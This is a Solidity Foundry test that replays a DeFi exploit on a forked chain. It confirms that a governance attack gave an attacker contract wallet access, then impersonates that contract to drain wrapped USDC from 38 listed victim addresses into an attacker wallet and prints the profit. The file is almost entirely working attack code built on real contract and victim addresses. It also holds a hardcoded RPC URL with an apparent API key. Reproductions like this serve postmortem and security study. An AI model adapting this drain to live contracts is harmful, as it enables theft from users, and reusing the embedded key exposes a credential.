// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IFutureSwapWallet {
    function sendFundsToExternalAccount(
        address tokenAsset,
        address from,
        address to,
        uint256 amount
    ) external;
}

interface IRegistry {
    function hasWalletAccess(address wallet) external view returns (bool);
}

interface IWrappedToken {
    function balanceOf(address account) external view returns (uint256);
}

contract FullExploitTest is Test {
    address constant FUTURESWAP_WALLET = 0xd1Ed35A3Ee043683A1833509dE8f2C1A0d8777B7;
    address constant REGISTRY = 0x3659ae5f9b009603a4900891aABEF828C8350df1;
    address constant WRAPPED_USDC = 0x91a154F9AD33da7e889C4b6fE4A9F9C3Fc6B6081;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ATTACKER_CONTRACT = 0xBc59f04fA5E5936cf49991A268832714F17bFFA7;
    address constant ATTACKER_WALLET = 0xCD7C839C6814234601fE7719dA21a980c1a8184E;
    address constant UNISWAP_PAIR = 0x88AE9E1625CfCbd128B89e7F037EaaF6a7cC9666;
    address constant FST_TOKEN = 0x0E192d382a36De7011F795Acc4391Cd302003606;
    uint256 constant GOVERNANCE_BLOCK = 24026876;
    uint256 constant DRAIN_BLOCK = 24027379;

    string constant RPC = "https://damp-autumn-snow.quiknode.pro/96d743facba7c1153305c1c9f3f7831caa512417";

    function getVictims() internal pure returns (address[38] memory) {
        return [
            0x119cBaD90c38eAC1F2De5B6d854Af4dbDf587154,
            0x28aC9E4EECa87b5310Cb64fbE8Ff22F498Deae07,
            0xa1F956C6F5AAE538CD8b330f1C4E8Da0Bb60C3D0,
            0x7cd7A5a66d3cd2F13559d7F8a052Fa6014e07d35,
            0x11d0Cb5C690bC838eFc52C621F6B48040dd000F7,
            0xf8523151211e6cFB2D285b9B92F2eE517722253B,
            0x20017a30D3156D4005bDA08C40Acda0A6aE209B1,
            0xfaD695eFD57aD18eA64bC45eB2f60d9e38bD436d,
            0x0b55491245F552Ab688F495E2e39283e982490c9,
            0xa942141E68013eF85e0AB54A448611dc6D8Bc1f3,
            0x4D1467C312a83794c99b9Db678DfdfA743394EF7,
            0x050cEA859b5A93Ac7Bd4db4572FB7d90b7c63CAC,
            0xD965952823153E5CBc611be87e8322cfc329f056,
            0xa5b8B83EFEd000C9F36D3ae3F19E1ab0542Cf3Af,
            0x869CAdbD7718e1e8dDd0dF2a98C04547546633D7,
            0xd30391E21741C54c32987bCfcA3D880E6D261Cb0,
            0x76f1487D7d3f7e94c1582f0EB77AE78b283a5af4,
            0x7e703E579159c033913046086807d8AC84B633fB,
            0xF71D161FdC3895F21612D79f15Aa819b7A3d296a,
            0xd1083574E4Ab99F4d56F49CC646308A73d835f2e,
            0x5F9E3E6C76760Ce49fBd87E857fc18EBB7527584,
            0xB60704D2cd7dcD1468675A68F4EC43791CE35EF9,
            0x4FA64F4aA9C4BAF921C8896461b10e7F3da7DB68,
            0xE7304bA0f157f2Ade94015934284b6704BC72911,
            0x057F8707F317023dB00518f3bb646136be909dfd,
            0xbcc3bFdc4bCe4BebBaAE2D8e143D6D6C61Eb6070,
            0xF1A0c1723b4791638382F479C16222De4201f9c2,
            0x46EEA8D5b37D2Db51f35c1bC8C50CBf80fb0fFE5,
            0xdc3B2DCE95eBd1E7C18eAa37780D10d240146660,
            0x762D8C60cA00607A705172D2cADA3d3F2BD5D07e,
            0xB1AdceddB2941033a090dD166a462fe1c2029484,
            0xa35d91b3852cc0E74FB1C0f095DD17eC6578104e,
            0xFef37Be95Be608Ed7277F777d8BA877aD70Df125,
            0xd00dc42F517e0b49D1c735EBA6AeeDe8642D6380,
            0xBA19BA5233b49794c33f01654e99A60E579E6f29,
            0xAB79b0b3ad3674403D8F18fF279F7d8A85822976,
            0x0d224c8D7CCD8Eb98779B7a262558d8D7590A65C,
            0xf1Ecc163903FB69Cce46D408E171C89EB7Ca1899
        ];
    }

    function getAmounts() internal pure returns (uint256[38] memory) {
        return [
            uint256(8633416228196489283265),
            uint256(3392786851427338452035),
            uint256(4427050785311602803373),
            uint256(1465296624039577069145),
            uint256(1758571961548314894211),
            uint256(10099086233265598205916),
            uint256(16088265589255436914291),
            uint256(1000000000000000000000),
            uint256(1515727646010685591554),
            uint256(2026213739042932989737),
            uint256(29709694285331240758878),
            uint256(1254125109866491381676),
            uint256(40187814332147989233794),
            uint256(1752017454834795055852),
            uint256(1922394910731822720722),
            uint256(1289085041075389953950),
            uint256(1127758380471610274059),
            uint256(1086512395682631177630),
            uint256(1141556737284890407367),
            uint256(1601941720000000000000),
            uint256(5419164231290055277519),
            uint256(22436603438846241692392),
            uint256(3252526293453724623985),
            uint256(4806241369698806403760),
            uint256(1720832944809219970394),
            uint256(2972892854181527905244),
            uint256(1054252381513335118377),
            uint256(1919007139771420815956),
            uint256(1335344100109013788665),
            uint256(2469264076213592904970),
            uint256(4785131098318012225914),
            uint256(11400086142607406666066),
            uint256(1651262103112013710810),
            uint256(54948802189559465465310),
            uint256(5495022180993564820474),
            uint256(4976362833346458920482),
            uint256(5140580704749298579128),
            uint256(2419034390026815936448)
        ];
    }

    function testFullExploit() public {

        vm.createSelectFork(RPC, GOVERNANCE_BLOCK - 1);

        bool accessBefore = IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT);
        uint256 walletWUSDBefore = IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET);
        uint256 attackerUSDBefore = IERC20(USDC).balanceOf(ATTACKER_WALLET);

        emit log_named_string("  Attacker hasWalletAccess", accessBefore ? "TRUE" : "FALSE");
        emit log_named_decimal_uint("  FutureSwap Wallet wUSDC", walletWUSDBefore, 18);
        emit log_named_decimal_uint("  Attacker USDC", attackerUSDBefore, 6);
        emit log("");
        emit log("  [*] Flash Loan Source (Uniswap V2 FST/WETH):");
        (uint112 reserve0,,) = IUniswapV2Pair(UNISWAP_PAIR).getReserves();
        emit log_named_decimal_uint("      FST Available", reserve0, 18);
        emit log("");
        emit log("  [*] FST Governance Token:");
        emit log_named_decimal_uint("      Total Supply", IERC20(FST_TOKEN).totalSupply(), 18);
        
        vm.createSelectFork(RPC, GOVERNANCE_BLOCK);

        bool accessAfterGov = IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT);
        emit log("");
        emit log_named_string("  Result: hasWalletAccess", accessAfterGov ? "TRUE [EXPLOITED]" : "FALSE");

        vm.createSelectFork(RPC, DRAIN_BLOCK - 1);

        uint256 walletWUSDBeforeDrain = IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET);
        uint256 attackerUSDBeforeDrain = IERC20(USDC).balanceOf(ATTACKER_WALLET);

        emit log("");
        emit log("  [Before Drain]");
        emit log_named_decimal_uint("    FutureSwap wUSDC", walletWUSDBeforeDrain, 18);
        emit log_named_decimal_uint("    Attacker USDC", attackerUSDBeforeDrain, 6);
        emit log("");
        emit log("  [Executing Drain - 38 victims]");
        address[38] memory victims = getVictims();
        uint256[38] memory amounts = getAmounts();
        uint256 totalDrained = 0;
        uint256 successCount = 0;

        vm.startPrank(ATTACKER_CONTRACT);

        for (uint i = 0; i < 38; i++) {
            try IFutureSwapWallet(FUTURESWAP_WALLET).sendFundsToExternalAccount(
                WRAPPED_USDC,
                victims[i],
                ATTACKER_WALLET,
                amounts[i]
            ) {
                uint256 usdcAmount = amounts[i] / 1e18;
                totalDrained += usdcAmount;
                successCount++;

                if (i < 5 || i >= 33) {
                    emit log(string(abi.encodePacked(
                        "    [+] Victim ", vm.toString(i + 1), ": $", vm.toString(usdcAmount), " USDC"
                    )));
                } else if (i == 5) {
                    emit log("    ... (draining remaining victims) ...");
                }
            } catch {
                emit log(string(abi.encodePacked("    [-] Victim ", vm.toString(i + 1), " failed")));
            }
        }

        vm.stopPrank();

        uint256 walletWUSDAfterDrain = IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET);
        uint256 attackerUSDAfterDrain = IERC20(USDC).balanceOf(ATTACKER_WALLET);
        uint256 profit = attackerUSDAfterDrain - attackerUSDBeforeDrain;

        emit log("");
        emit log_named_uint("  Victims Drained", successCount);
        emit log_named_decimal_uint("  FutureSwap wUSDC Remaining", walletWUSDAfterDrain, 18);
        emit log_named_decimal_uint("  Attacker USDC Before", attackerUSDBeforeDrain, 6);
        emit log_named_decimal_uint("  Attacker USDC After", attackerUSDAfterDrain, 6);
        emit log("");
        emit log("+---------------------------------------------------------------+");
        emit log_named_decimal_uint("  TOTAL PROFIT", profit, 6);
        emit log("+---------------------------------------------------------------+");
    }

    function testCompareBeforeAfter() public {

        vm.createSelectFork(RPC, GOVERNANCE_BLOCK - 1);
        emit log("[Block 24026875 - Before Governance Attack]");
        emit log_named_string("  hasWalletAccess", IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT) ? "TRUE" : "FALSE");
        emit log_named_decimal_uint("  FutureSwap wUSDC", IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET), 18);
        emit log_named_decimal_uint("  Attacker USDC", IERC20(USDC).balanceOf(ATTACKER_WALLET), 6);

        emit log("");
        vm.createSelectFork(RPC, GOVERNANCE_BLOCK);
        emit log("[Block 24026876 - After Governance Attack]");
        emit log_named_string("  hasWalletAccess", IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT) ? "TRUE <<<" : "FALSE");
        emit log_named_decimal_uint("  FutureSwap wUSDC", IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET), 18);
        emit log_named_decimal_uint("  Attacker USDC", IERC20(USDC).balanceOf(ATTACKER_WALLET), 6);

        emit log("");
        vm.createSelectFork(RPC, DRAIN_BLOCK - 1);
        emit log("[Block 24027378 - Before Drain]");
        emit log_named_string("  hasWalletAccess", IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT) ? "TRUE" : "FALSE");
        emit log_named_decimal_uint("  FutureSwap wUSDC", IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET), 18);
        emit log_named_decimal_uint("  Attacker USDC", IERC20(USDC).balanceOf(ATTACKER_WALLET), 6);

        emit log("");
        vm.createSelectFork(RPC, DRAIN_BLOCK);
        emit log("[Block 24027379 - After Drain]");
        emit log_named_string("  hasWalletAccess", IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT) ? "TRUE" : "FALSE");
        emit log_named_decimal_uint("  FutureSwap wUSDC", IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET), 18);
        emit log_named_decimal_uint("  Attacker USDC", IERC20(USDC).balanceOf(ATTACKER_WALLET), 6);
    }
}
